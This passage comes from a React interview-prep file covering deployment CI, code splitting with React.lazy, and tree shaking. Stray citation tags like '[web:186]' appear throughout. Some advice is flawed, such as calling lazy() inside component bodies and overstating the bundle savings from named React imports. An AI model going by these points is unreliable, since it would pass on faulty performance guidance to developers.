// Platform     | Ease | Cost      | Features
// -------------|------|-----------|------------------
// Netlify      | ⭐⭐⭐⭐⭐ | Free tier | Auto-deploy, forms, functions
// Vercel       | ⭐⭐⭐⭐⭐ | Free tier | Auto-deploy, serverless, analytics
// GitHub Pages | ⭐⭐⭐⭐   | Free      | Simple, git-based
// AWS S3       | ⭐⭐⭐    | Low cost  | Scalable, CloudFront CDN
// Firebase     | ⭐⭐⭐⭐   | Free tier | Auth, DB, hosting together
// Heroku       | ⭐⭐⭐    | Paid      | Full backend support
// Docker       | ⭐⭐     | Varies    | Full control, portable

// Recommendation:
// - Simple project: Netlify or Vercel
// - GitHub repo: GitHub Pages
// - Need backend: Heroku or AWS
// - Enterprise: AWS or Docker
// - Firebase services: Firebase Hosting

CI/CD Pipeline Example:
-----------------------

// .github/workflows/deploy.yml
name: Deploy to Netlify
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup Node
        uses: actions/setup-node@v2
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run tests
        run: npm test
      
      - name: Build
        run: npm run build
        env:
          REACT_APP_API_URL: ${{ secrets.API_URL }}
      
      - name: Deploy to Netlify
        uses: netlify/actions/cli@master
        env:
          NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
          NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
        with:
          args: deploy --prod --dir=build

Summary:

React Deployment:
- Build with npm run build
- Deploy static files to hosting
- Netlify/Vercel: Easiest, auto-deploy
- GitHub Pages: Free for open source
- AWS S3: Scalable, professional
- Docker: Full control
- Set environment variables per platform
- Configure SPA routing (/* → index.html)
- Use CI/CD for automation
*/


/**
107. What is code splitting and lazy loading in React?
-----------------------------------------------------

Code splitting breaks your app into smaller chunks that can be loaded on demand,
rather than loading everything upfront. Lazy loading is the technique of loading
these chunks only when needed, improving initial load time and performance.

The Problem:
------------

// Without code splitting: [web:186]
// All code in one bundle

import Home from './Home';
import About from './About';
import Dashboard from './Dashboard';
import Profile from './Profile';
import Settings from './Settings';
// ... 50 more imports

function App() {
  return (
    <Routes>
      <Route path="/" element={<Home />} />
      <Route path="/about" element={<About />} />
      <Route path="/dashboard" element={<Dashboard />} />
      {/* ... * /}
    </Routes>
  );
}

// Result: Single 500KB bundle
// User visits homepage → downloads entire 500KB
// Most code not needed for homepage!

React.lazy and Suspense:
------------------------

// Solution: Code split with React.lazy [web:186]

import { lazy, Suspense } from 'react';

// Lazy load components [web:186]
const Home = lazy(() => import('./Home'));
const About = lazy(() => import('./About'));
const Dashboard = lazy(() => import('./Dashboard'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/dashboard" element={<Dashboard />} />
      </Routes>
    </Suspense>
  );
}

// Now:
// - Homepage: Loads 50KB (Home chunk)
// - About page: Loads 30KB (About chunk)
// - Dashboard: Loads 100KB (Dashboard chunk)
// User only downloads what they need! [web:186]

How React.lazy Works:
---------------------

// React.lazy takes a function that returns dynamic import()
const LazyComponent = lazy(() => import('./Component'));

// Equivalent to:
const LazyComponent = lazy(() => {
  return import('./Component');
});

// Dynamic import() returns a Promise
import('./Component').then(module => {
  // module.default is the component
});

// React.lazy handles this Promise automatically

Suspense Fallback:
------------------

// Suspense shows fallback while loading [web:186]

function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <LazyComponent />
    </Suspense>
  );
}

// Multiple lazy components share Suspense
function App() {
  return (
    <Suspense fallback={<div>Loading page...</div>}>
      <LazyHeader />
      <LazyContent />
      <LazyFooter />
    </Suspense>
  );
}

// Nested Suspense for granular loading
function App() {
  return (
    <Suspense fallback={<AppSkeleton />}>
      <Header />
      
      <Suspense fallback={<ContentSkeleton />}>
        <LazyContent />
      </Suspense>
      
      <Suspense fallback={<SidebarSkeleton />}>
        <LazySidebar />
      </Suspense>
    </Suspense>
  );
}

Route-Based Code Splitting:
----------------------------

// Split by routes [web:186]

import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Lazy load route components [web:186]
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Products = lazy(() => import('./pages/Products'));
const ProductDetail = lazy(() => import('./pages/ProductDetail'));
const Dashboard = lazy(() => import('./pages/Dashboard'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<PageLoader />}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/products" element={<Products />} />
          <Route path="/products/:id" element={<ProductDetail />} />
          <Route path="/dashboard" element={<Dashboard />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// User visits /products → only Products chunk loads [web:186]

Component-Based Code Splitting:
--------------------------------

// Split large components [web:186]

function HomePage() {
  const [showModal, setShowModal] = useState(false);
  
  // Lazy load modal (only when opened) [web:186]
  const Modal = lazy(() => import('./Modal'));
  
  return (
    <div>
      <h1>Home Page</h1>
      <button onClick={() => setShowModal(true)}>
        Open Modal
      </button>
      
      {showModal && (
        <Suspense fallback={<ModalSkeleton />}>
          <Modal onClose={() => setShowModal(false)} />
        </Suspense>
      )}
    </div>
  );
}

// Modal code only loads when user clicks button [web:186]

Library Code Splitting:
------------------------

// Split heavy libraries

// Before: Chart.js loaded on every page
import Chart from 'chart.js';

function Dashboard() {
  return <Chart data={data} />;
}

// After: Chart.js only loads on Dashboard
const Chart = lazy(() => import('chart.js').then(module => ({
  default: module.Chart
})));

function Dashboard() {
  return (
    <Suspense fallback={<ChartSkeleton />}>
      <Chart data={data} />
    </Suspense>
  );
}

Named Exports:
--------------

// React.lazy only works with default exports

// ❌ Doesn't work with named exports
const MyComponent = lazy(() => import('./components')); // Has named exports

// ✅ Solution: Re-export as default
const MyComponent = lazy(() =>
  import('./components').then(module => ({
    default: module.MyComponent
  }))
);

// Or create intermediate file:
// MyComponent.js
export { MyComponent as default } from './components';

// App.js
const MyComponent = lazy(() => import('./MyComponent'));

Error Boundaries:
-----------------

// Handle loading errors

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  render() {
    if (this.state.hasError) {
      return <div>Something went wrong loading the page.</div>;
    }
    
    return this.props.children;
  }
}

// Use with Suspense
function App() {
  return (
    <ErrorBoundary>
      <Suspense fallback={<Loading />}>
        <LazyComponent />
      </Suspense>
    </ErrorBoundary>
  );
}

Preloading:
-----------

// Preload chunks before needed

// Component.js
export const preload = () => import('./HeavyComponent');

export default function Component() {
  const HeavyComponent = lazy(() => import('./HeavyComponent'));
  
  return (
    <div
      onMouseEnter={() => preload()} // Preload on hover
    >
      <Suspense fallback={<Loading />}>
        <HeavyComponent />
      </Suspense>
    </div>
  );
}

Real-World Example:
-------------------

// E-commerce app with code splitting

import { lazy, Suspense } from 'react';

// Core pages loaded immediately
import Header from './components/Header';
import Footer from './components/Footer';

// Lazy load routes [web:186]
const HomePage = lazy(() => import('./pages/HomePage'));
const ProductList = lazy(() => import('./pages/ProductList'));
const ProductDetail = lazy(() => import('./pages/ProductDetail'));
const Cart = lazy(() => import('./pages/Cart'));
const Checkout = lazy(() => import('./pages/Checkout'));
const UserProfile = lazy(() => import('./pages/UserProfile'));

// Heavy components lazy loaded
const ReviewsSection = lazy(() => import('./components/ReviewsSection'));
const RelatedProducts = lazy(() => import('./components/RelatedProducts'));

function App() {
  return (
    <div>
      <Header /> {/* Always loaded * /}
      
      <Suspense fallback={<PageSkeleton />}>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/products" element={<ProductList />} />
          <Route path="/products/:id" element={<ProductDetail />} />
          <Route path="/cart" element={<Cart />} />
          <Route path="/checkout" element={<Checkout />} />
          <Route path="/profile" element={<UserProfile />} />
        </Routes>
      </Suspense>
      
      <Footer /> {/* Always loaded * /}
    </div>
  );
}

function ProductDetail() {
  return (
    <div>
      <ProductInfo />
      
      {/* Lazy load below-the-fold content [web:186] * /}
      <Suspense fallback={<ReviewsSkeleton />}>
        <ReviewsSection />
      </Suspense>
      
      <Suspense fallback={<ProductsSkeleton />}>
        <RelatedProducts />
      </Suspense>
    </div>
  );
}

When to Code Split:
-------------------

// ✅ Good candidates for code splitting: [web:186]

// 1. Routes (different pages)
const Dashboard = lazy(() => import('./Dashboard'));

// 2. Modal/Dialog components
const Modal = lazy(() => import('./Modal'));

// 3. Heavy third-party libraries
const Editor = lazy(() => import('react-quill'));

// 4. Below-the-fold content [web:186]
const Comments = lazy(() => import('./Comments'));

// 5. Admin/authenticated features
const AdminPanel = lazy(() => import('./AdminPanel'));

// 6. Conditional features
const AdvancedFeature = lazy(() => import('./AdvancedFeature'));

// ❌ Don't code split: [web:186]

// 1. Critical content (above the fold)
// - Header, main content, hero sections [web:186]

// 2. Small components
// - Not worth the overhead

// 3. Frequently used components
// - Better to load upfront

Performance Impact:
-------------------

// Before code splitting:
// Initial bundle: 500KB
// Time to Interactive: 3s

// After code splitting: [web:186]
// Initial bundle: 100KB (80% reduction)
// Homepage chunk: 50KB
// About chunk: 30KB
// Dashboard chunk: 150KB
// Time to Interactive: 0.8s (4x faster!) [web:186]

Bundle Analysis:
----------------

// Analyze bundle size
npm run build -- --stats

// Use webpack-bundle-analyzer
npm install --save-dev webpack-bundle-analyzer

// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer build/bundle-stats.json"
  }
}

// Identify large chunks to split [web:186]

Summary:

Code Splitting & Lazy Loading:
- Break app into smaller chunks [web:186]
- Load only what's needed [web:186]
- Use React.lazy() for components [web:186]
- Wrap with Suspense [web:186]
- Split by routes [web:186]
- Split large components [web:186]
- Improves initial load time [web:186]
- Better user experience [web:186]
- Use strategically [web:186]
*/


/**
108. What is tree shaking in React apps?
----------------------------------------

Tree shaking is a build optimization technique that removes unused code
(dead code) from the final JavaScript bundle. It's called "tree shaking"
because it shakes off dead leaves (unused code) from the dependency tree.

How Tree Shaking Works:
------------------------

// Modern build tools (Webpack, Rollup, etc.) analyze code
// Remove code that's imported but never used

// math.js
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

export function multiply(a, b) {
  return a * b;
}

export function divide(a, b) {
  return a / b;
}

// App.js
import { add, subtract } from './math';

console.log(add(2, 3)); // Used
// subtract is imported but never used
// multiply and divide never imported

// After tree shaking: [web:187]
// Only add() included in bundle
// subtract(), multiply(), divide() removed
// Smaller bundle size!

ES6 Modules Required:
---------------------

// Tree shaking only works with ES6 modules [web:190]

// ✅ Works with ES6 imports/exports
import { Component } from 'react';
export function MyFunction() {}

// ❌ Doesn't work with CommonJS
const React = require('react');
module.exports = function MyFunction() {}

// Why? ES6 modules are statically analyzable
// Build tools can determine what's used at compile time

React and Tree Shaking:
-----------------------

// React is tree-shakeable

// Before tree shaking:
import React from 'react';

// Imports entire React library (~100KB)

// After tree shaking:
import { useState, useEffect } from 'react';

// Only imports used hooks
// Unused React features removed
// Smaller bundle!

// Modern React (17+) even better:
// No need to import React for JSX
// Automatic JSX runtime
// Further bundle size reduction

Library Examples:
-----------------

// Example 1: Lodash

// ❌ Bad: Imports entire library (70KB)
import _ from 'lodash';
_.debounce(func, 100);

// ✅ Good: Import only what's needed (5KB)
import debounce from 'lodash/debounce';
debounce(func, 100);

// ✅ Even better: Use lodash-es (ES6 modules)
import { debounce } from 'lodash-es';
debounce(func, 100);

// Example 2: Material-UI

// ❌ Bad: Imports entire library
import { Button, TextField } from '@material-ui/core';

// ✅ Good: Individual imports
import Button from '@material-ui/core/Button';
import TextField from '@material-ui/core/TextField';

// Example 3: Date-fns

// ✅ Good: Already ES6 modules, tree-shakeable
import { format, addDays } from 'date-fns';

package.json sideEffects:
--------------------------

// Tell bundler which files have side effects [web:187][web:190]

// package.json
{
  "name": "my-library",
  "sideEffects": false  // No side effects, tree shake everything
}

// Or specify files with side effects:
{
  "sideEffects": [
    "*.css",
    "*.scss",
    "./src/polyfills.js"
  ]
}

// Side effect: Code that does something when imported [web:190]

// sideEffect.js
console.log('This runs on import!'); // Side effect
window.myGlobal = 'value'; // Side effect

export function myFunction() {} // No side effect

// If file has side effects, bundler keeps it
// Even if nothing is used from it [web:190]

Production Mode:
----------------

// Tree shaking enabled in production mode

// package.json
{
  "scripts": {
    "build": "react-scripts build" // Production mode
  }
}

// Webpack production mode:
// - Enables tree shaking
// - Minification
// - Dead code elimination

// Create React App handles this automatically

Tree Shaking in Action:
------------------------

// components.js
export function Button() {
  return <button>Click</button>;
}

export function Input() {
  return <input />;
}

export function Select() {
  return <select></select>;
}

export function Checkbox() {
  return <input type="checkbox" />;
}

// App.js
import { Button, Input } from './components';

function App() {
  return (
    <div>
      <Button />
      <Input />
    </div>
  );
}

// Build output includes:
// ✅ Button (used)
// ✅ Input (used)
// ❌ Select (removed - unused)
// ❌ Checkbox (removed - unused)

CSS Tree Shaking:
-----------------

// Remove unused CSS

// ❌ Problem: All CSS loaded
import './styles.css'; // 500KB

// ✅ Solution: CSS Modules (scoped CSS)
import styles from './Component.module.css';

function Component() {
  return <div className={styles.container}>Content</div>;
}

// Only used classes included

// ✅ Better: Tailwind CSS with PurgeCSS
// tailwind.config.js
module.exports = {
  purge: ['./src/** /*.{js,jsx,ts,tsx}'],
  // Scans files, removes unused Tailwind classes
};

// Result: 3MB → 10KB

Analyzing Bundle:
-----------------

// Check what's in your bundle

// 1. Build with stats
npm run build -- --stats

// 2. Analyze with webpack-bundle-analyzer
npm install --save-dev webpack-bundle-analyzer

// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer build/bundle-stats.json"
  }
}

npm run analyze

// Opens visual representation:
// - See all dependencies
// - Identify large libraries
// - Find optimization opportunities

Optimization Tips:
------------------

// 1. Use ES6 imports [web:190]
// ✅ Good
import { feature } from 'library';

// ❌ Bad
const library = require('library');

// 2. Import only what you need
// ✅ Good
import { useState } from 'react';

// ❌ Bad
import React from 'react';
React.useState();

// 3. Use ES6 module versions of libraries
// lodash → lodash-es
// moment → date-fns

// 4. Configure sideEffects in package.json [web:187][web:190]
{
  "sideEffects": ["*.css"]
}

// 5. Use dynamic imports for code splitting
const Component = lazy(() => import('./Component'));

// 6. Avoid barrel files (index.js that re-exports)
// ❌ Bad: components/index.js
export { Button } from './Button';
export { Input } from './Input';
// ... 50 components

// Importing one imports all (bundle analysis)
import { Button } from './components';

// ✅ Good: Import directly
import { Button } from './components/Button';

Common Issues:
--------------

// 1. CommonJS modules not tree-shakeable
// Solution: Use ES6 version or replace library

// 2. Default imports include everything
// Solution: Use named imports

// 3. Side effects prevent tree shaking [web:190]
// Solution: Mark sideEffects in package.json [web:187]

// 4. Dynamic imports prevent static analysis
// Solution: Use when needed, but know the trade-off

Summary:

Tree Shaking:
- Removes unused code [web:187][web:190]
- Reduces bundle size [web:190]
- Works with ES6 modules [web:190]
- Production mode only
- Configure sideEffects [web:187][web:190]
- Use named imports
- Choose tree-shakeable libraries
- Analyze bundle to optimize
- Automatic in Create React App
*/



